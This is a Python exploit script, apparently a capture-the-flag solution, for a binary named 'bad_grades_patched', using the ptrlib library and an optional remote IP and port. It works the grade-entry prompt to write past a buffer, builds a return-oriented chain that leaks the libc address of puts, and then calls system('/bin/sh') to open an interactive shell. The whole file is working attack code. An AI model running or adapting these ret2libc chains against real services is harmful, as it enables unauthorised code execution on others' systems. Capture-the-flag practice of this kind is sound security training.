#!/usr/bin/env python
from time import sleep
import ptrlib as ptr
import sys

exe = ptr.ELF("./bad_grades_patched")
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket('94.237.49.212', 45343)
    else:
        # ptr.Socket()
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x

        # io.sendline(pl[i:i+8])


def main():
    io = connect()

    def send(pl: bytes):
        if len(pl) % 8 != 0:
            ptr.logger.error("pl is not 8bit aligned")
            exit()
        io.sendlineafter("Number of grades: ", str(35 + len(pl) // 8))
        for i in range(35):
            io.sendlineafter(f"Grade [{i + 1}]: ", ".")
        for i in range(len(pl) // 8):
            io.sendlineafter(
                f"Grade [{35 + i + 1}]: ", str(ptr.u64f(pl[i * 8 : i * 8 + 8]))
            )

        return

    pl = b""
    pl += ptr.p64(next(exe.gadget("pop rdi; ret;")))
    pl += ptr.p64(unwrap(exe.got("puts")))
    pl += ptr.p64(unwrap(exe.plt("puts")))
    pl += ptr.p64(0x400FD5)

    io.sendlineafter("> ", "2")
    send(pl)
    io.recvlineafter("Your new average")
    libc.base = ptr.u64(io.recv(6)) - unwrap(libc.symbol("puts"))

    pl2 = b""
    pl2 += ptr.p64(next(libc.gadget("ret;")))
    pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl2 += ptr.p64(next(libc.find("/bin/sh")))
    pl2 += ptr.p64(unwrap(libc.symbol("system")))

    send(pl2)
    io.recvlineafter("Your new average is:")
    io.sh()



if __name__ == "__main__":
    main()
